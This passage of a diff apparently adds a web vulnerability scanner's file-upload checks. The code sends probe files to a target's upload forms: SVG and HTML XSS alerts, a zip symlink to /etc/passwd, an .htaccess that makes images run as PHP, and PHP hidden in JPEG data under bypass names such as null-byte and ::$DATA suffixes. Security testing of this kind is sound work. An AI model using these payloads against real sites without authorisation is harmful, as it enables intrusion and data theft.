0x64, 0x2D, 0x31, 0x31,  0x64, 0x61, 0x2D, 0x61, 0x64, 0x33, 0x31, 0x2D, 0x64, 0x33, 0x33, 0x64, 0x37, 0x35, 0x31,  0x38, 0x32, 0x66, 0x31, 0x62, 0x22, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3A, 0x64, 0x63,  0x3D, 0x22, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x70, 0x75, 0x72, 0x6C, 0x2E, 0x6F,  0x72, 0x67, 0x2F, 0x64, 0x63, 0x2F, 0x65, 0x6C, 0x65, 0x6D, 0x65, 0x6E, 0x74, 0x73, 0x2F,  0x31, 0x2E, 0x31, 0x2F, 0x22, 0x2F, 0x3E, 0x3C, 0x2F, 0x72, 0x64, 0x66, 0x3A, 0x52, 0x44,  0x46, 0x3E, 0x3C, 0x2F, 0x78, 0x3A, 0x78, 0x6D, 0x70, 0x6D, 0x65, 0x74, 0x61, 0x3E, 0x0D,  0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0A, 0x20, 0x20, 0x20,  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x3F, 0x78, 0x70,  0x61, 0x63, 0x6B, 0x65, 0x74, 0x20, 0x65, 0x6E, 0x64, 0x3D, 0x27, 0x77, 0x27, 0x3F, 0x3E,  0xFF, 0xDB, 0x00, 0x43, 0x00, 0x1B, 0x1A, 0x1A, 0x29, 0x1D, 0x29, 0x41, 0x26, 0x26, 0x41,  0x42, 0x2F, 0x2F, 0x2F, 0x42, 0x47, 0x3F, 0x3E, 0x3E, 0x3F, 0x47, 0x47, 0x47, 0x47, 0x47,  0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47,  0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47,  0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0xFF, 0xDB, 0x00, 0x43, 0x01, 0x1D,  0x29, 0x29, 0x34, 0x26, 0x34, 0x3F, 0x28, 0x28, 0x3F, 0x47, 0x3F, 0x35, 0x3F, 0x47, 0x47,  0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47,  0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47,  0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47,  0x47, 0x47, 0x47, 0xFF, 0xC0, 0x00, 0x11, 0x08, 0x00, 0x80, 0x00, 0x80, 0x03, 0x01, 0x22,  0x00, 0x02, 0x11, 0x01, 0x03, 0x11, 0x01, 0xFF, 0xC4, 0x00, 0x15, 0x00, 0x01, 0x01, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06,  0xFF, 0xC4, 0x00, 0x14, 0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xC4, 0x00, 0x14, 0x01, 0x01, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF,  0xC4, 0x00, 0x14, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xDA, 0x00, 0x0C, 0x03, 0x01, 0x00, 0x02, 0x11,  0x03, 0x11, 0x00, 0x3F, 0x00, 0xA6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xFF, 0xD9);
+		
+		var fileInputList = new TList();
+		var varIndex = 0;		
+		// make a list with all file inputs
+		for(var i=0; i<this.scheme.inputCount; i++){
+			if (this.scheme.getInputFlags(i) & INPUT_FLAG_IS_FILE) fileInputList.add(i);
+		}	
+		if (fileInputList.count == 0) return true; 
+		// select variations that don't depend on the file input list
+		var variations = this.scheme.selectVariationsForInputList(fileInputList);
+		// itterate through all selected variations
+		for(var i=0; i<variations.count; i++){
+			// load selected variation
+			this.scheme.loadVariation(variations.item(i));
+			// save variation index
+			varIndex = i;
+			//trace("varIndex=" + varIndex);
+			
+			// set the test on all matching inputs
+			for(var j=0; j<fileInputList.count; j++){
+				this.scheme.setInputFileName(fileInputList.item(j), filename);
+				this.scheme.setInputContentType(fileInputList.item(j), contenttype);		
+				this.scheme.setInputValue(fileInputList.item(j), payload);
+			}
+			// create http job
+			this.lastJob = new THTTPJob();
+			this.lastJob.url = TargetUrl;
+			
+			this.scheme.populateRequest(this.lastJob);
+			
+			this.lastJob.execute();
+			
+			if(!this.lastJob.wasError){				
+				var hq = new THTMLQuery(this.lastJob.response.body);
+				if (hq.executeHtmlQuery("tag=svg|onload=alert(7346763)")) {					
+					this.alertEXIFXSS(this.scheme.getInputName(fileInputList.item(0)), filename, contenttype);
+					return false;
+				}
+			}
+		}
+		
+		return false;
+	}
+	classFileUpload.prototype.startTesting = function() 
+	{
+		if (this.scheme.hasFileInput) 
+		{
+			var maxRandomNumber = 10000;
+			var numberTests = 19;
+			
+			// is we are unable to prepare upload URLs we just return
+			if (this.prepareUploadURLs()) return;
+			// don't run if Amazon S3 is not reachable
+    		var AmazonS3Disabled = getGlobalValue("AmazonS3ScriptsDisabled");
+    		if (!AmazonS3Disabled) {			
+				// test for XXE on file upload
+				if 	(!this.TestXXEFileUpload("AcuTest" + random(maxRandomNumber) + ".xml", "text/xml")) 
+					(this.TestXXEFileUpload("AcuTest" + random(maxRandomNumber) + ".jpg", "image/jpeg"));
+                // test for XSLT on file upload
+                this.TestXSLTFileUpload("AcuTest" + random(maxRandomNumber) + ".xml", "text/xml");
+			}
+            // the perl jam 2
+            if (this.scheme.path) {
+                var schemeInputType = this.scheme.getInputTypeStr(this.inputIndex);
+                var pathExtension = getFileExt(this.scheme.path);
+                // for perl and cgi try some particular exploit (the perl jam)
+                if (pathExtension && (pathExtension == "cgi" || pathExtension == "pl")) {
+                    // perl jam 2
+                    this.TestPerlJam2();
+                }
+            }
+            // upload a zip with a symlink to /etc/passwd
+			this.TestZipSymlinkUpload("AcuTest" + random(maxRandomNumber) + ".zip", "application/octet-stream");
+			
+			// upload an image with EXIF data containing XSS
+			this.TestImageUploadExifXSS("AcuTestEXIF" + random(maxRandomNumber) + ".jpg", "image/jpeg");
+			// upload a normal file to detect upload directory
+			ScriptProgress(ComputeProgress(1, numberTests));
+			this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".jpg", "image/jpeg", b642plain("/9j/4AAQSkZJRgABAQEASABIAAD//gAyPD9waHAgZWNobyhtZDUoJ2FjdW5ldGl4LWZpbGUtdXBsb2FkLXRlc3QnKSk7ID8+/9sAQwAFAwQEBAMFBAQEBQUFBgcMCAcHBwcPCwsJDBEPEhIRDxERExYcFxMUGhURERghGBodHR8fHxMXIiQiHiQcHh8e/9sAQwEFBQUHBgcOCAgOHhQRFB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e/8AAEQgAAQABAwEiAAIRAQMRAf/EABUAAQEAAAAAAAAAAAAAAAAAAAAI/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/EABQBAQAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCywAf/2Q=="), detectURLstr);
+			
+			// we don't test the uploads unless we managed to find at least one upload URL
+			if (this.foundOneUploadURL == true)
+			{
+				ScriptProgress(ComputeProgress(1, numberTests));
+                
+				// Cross domain data hijacking
+				var cddhPayload = strFromRawData(0x50, 0x4B, 0x03, 0x04, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x38, 0x4D, 0x46, 0x0A, 0xB9, 0x1F, 0x29, 0x0B, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x04, 0x00, 0x1C, 0x00, 0x6C, 0x69, 0x6E, 0x6B, 0x55, 0x54, 0x09, 0x00, 0x03, 0x7B, 0x11, 0xDE, 0x54, 0x7C, 0x11, 0xDE, 0x54, 0x75, 0x78, 0x0B, 0x00, 0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x2F, 0x65, 0x74, 0x63, 0x2F, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x50, 0x4B, 0x01, 0x02, 0x1E, 0x03, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x38, 0x4D, 0x46, 0x0A, 0xB9, 0x1F, 0x29, 0x0B, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x04, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xA1, 0x00, 0x00, 0x00, 0x00, 0x6C, 0x69, 0x6E, 0x6B, 0x55, 0x54, 0x05, 0x00, 0x03, 0x7B, 0x11, 0xDE, 0x54, 0x75, 0x78, 0x0B, 0x00, 0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x50, 0x4B, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x4A, 0x00, 0x00, 0x00, 0x49, 0x00, 0x00, 0x00, 0x00, 0x00);
+				this.TestFileUpload("CDDH" + random(maxRandomNumber) + ".jpg", "image/jpeg", cddhPayload, cddhPayload);
+                
+				// Applet upload
+				var appletPayload = strFromRawData(0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x03, 0x00, 0x2D, 0x00, 0x1A, 0x08, 0x00, 0x15, 0x07, 0x00,  0x12, 0x07, 0x00, 0x18, 0x07, 0x00, 0x11, 0x0A, 0x00, 0x02, 0x00, 0x08, 0x0A, 0x00, 0x04,  0x00, 0x07, 0x0C, 0x00, 0x10, 0x00, 0x16, 0x0C, 0x00, 0x14, 0x00, 0x19, 0x01, 0x00, 0x16,  0x28, 0x4C, 0x6A, 0x61, 0x76, 0x61, 0x2F, 0x61, 0x77, 0x74, 0x2F, 0x47, 0x72, 0x61, 0x70,  0x68, 0x69, 0x63, 0x73, 0x3B, 0x29, 0x56, 0x01, 0x00, 0x0D, 0x43, 0x6F, 0x6E, 0x73, 0x74,  0x61, 0x6E, 0x74, 0x56, 0x61, 0x6C, 0x75, 0x65, 0x01, 0x00, 0x0A, 0x45, 0x78, 0x63, 0x65,  0x70, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x01, 0x00, 0x0F, 0x4C, 0x69, 0x6E, 0x65, 0x4E, 0x75,  0x6D, 0x62, 0x65, 0x72, 0x54, 0x61, 0x62, 0x6C, 0x65, 0x01, 0x00, 0x0A, 0x53, 0x6F, 0x75,  0x72, 0x63, 0x65, 0x46, 0x69, 0x6C, 0x65, 0x01, 0x00, 0x0E, 0x4C, 0x6F, 0x63, 0x61, 0x6C,  0x56, 0x61, 0x72, 0x69, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x01, 0x00, 0x04, 0x43, 0x6F, 0x64,  0x65, 0x01, 0x00, 0x0A, 0x64, 0x72, 0x61, 0x77, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x01,  0x00, 0x11, 0x6A, 0x61, 0x76, 0x61, 0x2F, 0x61, 0x77, 0x74, 0x2F, 0x47, 0x72, 0x61, 0x70,  0x68, 0x69, 0x63, 0x73, 0x01, 0x00, 0x12, 0x6A, 0x61, 0x76, 0x61, 0x2F, 0x61, 0x70, 0x70,  0x6C, 0x65, 0x74, 0x2F, 0x41, 0x70, 0x70, 0x6C, 0x65, 0x74, 0x01, 0x00, 0x0F, 0x48, 0x65,  0x6C, 0x6C, 0x6F, 0x57, 0x6F, 0x72, 0x6C, 0x64, 0x2E, 0x6A, 0x61, 0x76, 0x61, 0x01, 0x00,  0x06, 0x3C, 0x69, 0x6E, 0x69, 0x74, 0x3E, 0x01, 0x00, 0x0C, 0x48, 0x65, 0x6C, 0x6C, 0x6F,  0x20, 0x77, 0x6F, 0x72, 0x6C, 0x64, 0x21, 0x01, 0x00, 0x17, 0x28, 0x4C, 0x6A, 0x61, 0x76,  0x61, 0x2F, 0x6C, 0x61, 0x6E, 0x67, 0x2F, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x3B, 0x49,  0x49, 0x29, 0x56, 0x01, 0x00, 0x05, 0x70, 0x61, 0x69, 0x6E, 0x74, 0x01, 0x00, 0x0A, 0x48,  0x65, 0x6C, 0x6C, 0x6F, 0x57, 0x6F, 0x72, 0x6C, 0x64, 0x01, 0x00, 0x03, 0x28, 0x29, 0x56,  0x00, 0x01, 0x00, 0x03, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01, 0x00,  0x17, 0x00, 0x09, 0x00, 0x01, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x27, 0x00, 0x04, 0x00, 0x02,  0x00, 0x00, 0x00, 0x0B, 0x2B, 0x12, 0x01, 0x10, 0x32, 0x10, 0x19, 0xB6, 0x00, 0x06, 0xB1,  0x00, 0x00, 0x00, 0x01, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x02, 0x00, 0x00, 0x00,  0x06, 0x00, 0x0A, 0x00, 0x05, 0x00, 0x01, 0x00, 0x14, 0x00, 0x19, 0x00, 0x01, 0x00, 0x0F,  0x00, 0x00, 0x00, 0x1D, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x2A, 0xB7, 0x00,  0x05, 0xB1, 0x00, 0x00, 0x00, 0x01, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x06, 0x00, 0x01, 0x00,  0x00, 0x00, 0x04, 0x00, 0x01, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x02, 0x00, 0x13);
+				if (!this.TestFileUpload("Applet" + random(maxRandomNumber) + ".class", "image/jpeg", appletPayload, appletPayload))
+					this.TestFileUpload("Applet" + random(maxRandomNumber) + ".jar", "image/jpeg", appletPayload, appletPayload);                
+                // test xss via svg
+                this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".svg", "application/xml", b642plain("PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4NCjx1c2UgeGxpbms6aHJlZj0iZGF0YTphcHBsaWNhdGlvbi94bWw7YmFzZTY0LFBITjJaeUI0Yld4dWN6MGlhSFIwY0RvdkwzZDNkeTUzTXk1dmNtY3ZNakF3TUM5emRtY2lJSGh0Ykc1ek9uaHNhVzVyUFNKb2RIUndPaTh2ZDNkM0xuY3pMbTl5Wnk4eE9UazVMM2hzYVc1cklqNE5DanhrWldaelBnMEtQR05wY21Oc1pTQnBaRDBpZEdWemRDSWdjajBpTlRBaUlHTjRQU0l4TURBaUlHTjVQU0l4TURBaUlITjBlV3hsUFNKbWFXeHNPaUFqUmpBd0lqNE5Danh6WlhRZ1lYUjBjbWxpZFhSbFRtRnRaVDBpWm1sc2JDSWdZWFIwY21saWRYUmxWSGx3WlQwaVExTlRJaUJ2Ym1KbFoybHVQU2RoYkdWeWRDZ3hLU2NnYjI1bGJtUTlKMkZzWlhKMEtESXBKeUIwYnowaUl6QXdSaUlnWW1WbmFXNDlJakZ6SWlCa2RYSTlJalZ6SWlBdlBnMEtQQzlqYVhKamJHVStEUW84TDJSbFpuTStEUW84ZFhObElIaHNhVzVyT21oeVpXWTlJaU4wWlhOMElpOCtEUW84TDNOMlp6NGcjdGVzdCIvPg0KPC9zdmc+ICAg"), '<use xlink:href="data:application/xml;base64,', 0, 'svg');
+				// test xss
+				if (!this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".htm", "text/html", b642plain("PHNjcmlwdD5hbGVydCgnYWN1bmV0aXggeHNzIHRlc3QnKTs8L3NjcmlwdD4="), "<script>alert('acunetix xss test');</script>", 0, 'html'))
+					this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".htm", "image/jpeg", b642plain("PHNjcmlwdD5hbGVydCgnYWN1bmV0aXggeHNzIHRlc3QnKTs8L3NjcmlwdD4="), "<script>alert('acunetix xss test');</script>", 0, 'html');
+				// test shell upload
+				ScriptProgress(ComputeProgress(2, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".php", "image/jpeg", b642plain("/9j/4AAQSkZJRgABAQEASABIAAD//gAyPD9waHAgZWNobyhtZDUoJ2FjdW5ldGl4LWZpbGUtdXBsb2FkLXRlc3QnKSk7ID8+/9sAQwAFAwQEBAMFBAQEBQUFBgcMCAcHBwcPCwsJDBEPEhIRDxERExYcFxMUGhURERghGBodHR8fHxMXIiQiHiQcHh8e/9sAQwEFBQUHBgcOCAgOHhQRFB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e/8AAEQgAAQABAwEiAAIRAQMRAf/EABUAAQEAAAAAAAAAAAAAAAAAAAAI/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/EABQBAQAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCywAf/2Q=="), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(3, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".php.php.rar	", "image/jpeg", b642plain("/9j/4AAQSkZJRgABAQEASABIAAD//gAyPD9waHAgZWNobyhtZDUoJ2FjdW5ldGl4LWZpbGUtdXBsb2FkLXRlc3QnKSk7ID8+/9sAQwAFAwQEBAMFBAQEBQUFBgcMCAcHBwcPCwsJDBEPEhIRDxERExYcFxMUGhURERghGBodHR8fHxMXIiQiHiQcHh8e/9sAQwEFBQUHBgcOCAgOHhQRFB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e/8AAEQgAAQABAwEiAAIRAQMRAf/EABUAAQEAAAAAAAAAAAAAAAAAAAAI/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/EABQBAQAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCywAf/2Q=="), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(4, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".php3", "image/jpeg", b642plain("/9j/4AAQSkZJRgABAQEASABIAAD//gAyPD9waHAgZWNobyhtZDUoJ2FjdW5ldGl4LWZpbGUtdXBsb2FkLXRlc3QnKSk7ID8+/9sAQwAFAwQEBAMFBAQEBQUFBgcMCAcHBwcPCwsJDBEPEhIRDxERExYcFxMUGhURERghGBodHR8fHxMXIiQiHiQcHh8e/9sAQwEFBQUHBgcOCAgOHhQRFB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e/8AAEQgAAQABAwEiAAIRAQMRAf/EABUAAQEAAAAAAAAAAAAAAAAAAAAI/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/EABQBAQAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCywAf/2Q=="), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(5, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".php\x00.jpg", "image/jpeg", b642plain("/9j/4AAQSkZJRgABAQEARwBHAAD//gAyPD9waHAgZWNobyhtZDUoJ2FjdW5ldGl4LWZpbGUtdXBsb2FkLXRlc3QnKSk7ID8+/9sAQwAFAwQEBAMFBAQEBQUFBgcMCAcHBwcPCwsJDBEPEhIRDxERExYcFxMUGhURERghGBodHR8fHxMXIiQiHiQcHh8e/9sAQwEFBQUHBgcOCAgOHhQRFB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e/8AAEQgAEAAQAwEiAAIRAQMRAf/EABYAAQEBAAAAAAAAAAAAAAAAAAQAAf/EACIQAAEEAgEEAwAAAAAAAAAAAAIBAwQFBhEHABITMSFBYf/EABUBAQEAAAAAAAAAAAAAAAAAAAQH/8QAIhEBAAECBAcAAAAAAAAAAAAAERIAEwMEFUEiJTJCYqGx/9oADAMBAAIRAxEAPwB1CxxdV8a01pk9Lb3OQ2kmajcaHZymyMQlutivaDqCKIIiKaT5169r1t9H4utONLm1xelt6bIauTCRyNMs5ThNi5LabJe03VEkUSIV2nxv16XovHzvH7IVFhkmT2tfMhx7CG/EYqZZkPklSDbcbeBshRex7e039fvVyA7x+63cWGN5Ra2EybHr4jEN+plgReKVHNxxx420FV7Gd7XX3+dI5vqvfC55BL5VPhlmLiXVeIZ9IAb+9q//2Q=="), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(6, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".phtml", "image/jpeg", b642plain("/9j/4AAQSkZJRgABAQEASABIAAD//gAyPD9waHAgZWNobyhtZDUoJ2FjdW5ldGl4LWZpbGUtdXBsb2FkLXRlc3QnKSk7ID8+/9sAQwAFAwQEBAMFBAQEBQUFBgcMCAcHBwcPCwsJDBEPEhIRDxERExYcFxMUGhURERghGBodHR8fHxMXIiQiHiQcHh8e/9sAQwEFBQUHBgcOCAgOHhQRFB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e/8AAEQgAAQABAwEiAAIRAQMRAf/EABUAAQEAAAAAAAAAAAAAAAAAAAAI/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/EABQBAQAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCywAf/2Q=="), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(7, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".php", "text/plain", b642plain("PD9waHAgZWNobyhtZDUoJ2FjdW5ldGl4LWZpbGUtdXBsb2FkLXRlc3QnKSk7ID8+"), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(8, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".php.jpg", "image/jpeg", b642plain("/9j/4AAQSkZJRgABAQEASABIAAD//gAyPD9waHAgZWNobyhtZDUoJ2FjdW5ldGl4LWZpbGUtdXBsb2FkLXRlc3QnKSk7ID8+/9sAQwAFAwQEBAMFBAQEBQUFBgcMCAcHBwcPCwsJDBEPEhIRDxERExYcFxMUGhURERghGBodHR8fHxMXIiQiHiQcHh8e/9sAQwEFBQUHBgcOCAgOHhQRFB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e/8AAEQgAAQABAwEiAAIRAQMRAf/EABUAAQEAAAAAAAAAAAAAAAAAAAAI/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/EABQBAQAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCywAf/2Q=="), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(9, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".php.123", "image/png", b642plain("/9j/4AAQSkZJRgABAQEASABIAAD//gAyPD9waHAgZWNobyhtZDUoJ2FjdW5ldGl4LWZpbGUtdXBsb2FkLXRlc3QnKSk7ID8+/9sAQwAFAwQEBAMFBAQEBQUFBgcMCAcHBwcPCwsJDBEPEhIRDxERExYcFxMUGhURERghGBodHR8fHxMXIiQiHiQcHh8e/9sAQwEFBQUHBgcOCAgOHhQRFB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e/8AAEQgAAQABAwEiAAIRAQMRAf/EABUAAQEAAAAAAAAAAAAAAAAAAAAI/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/EABQBAQAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCywAf/2Q=="), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(10, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".php::$DATA", "image/png", b642plain("/9j/4AAQSkZJRgABAQEASABIAAD//gAyPD9waHAgZWNobyhtZDUoJ2FjdW5ldGl4LWZpbGUtdXBsb2FkLXRlc3QnKSk7ID8+/9sAQwAFAwQEBAMFBAQEBQUFBgcMCAcHBwcPCwsJDBEPEhIRDxERExYcFxMUGhURERghGBodHR8fHxMXIiQiHiQcHh8e/9sAQwEFBQUHBgcOCAgOHhQRFB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e/8AAEQgAAQABAwEiAAIRAQMRAf/EABUAAQEAAAAAAAAAAAAAAAAAAAAI/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/EABQBAQAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCywAf/2Q=="), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(11, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".htaccess", "image/jpeg", b642plain("I0FjdW5ldGl4IC5odGFjY2VzcyBGaWxlIFVwbG9hZCB0ZXN0DQpBZGRUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwIC5qcGcgLnBuZyAuZ2lmIC5odG0gLmh0bWwg"), "#Acunetix .htaccess File Upload test")) return;
+				ScriptProgress(ComputeProgress(12, numberTests));
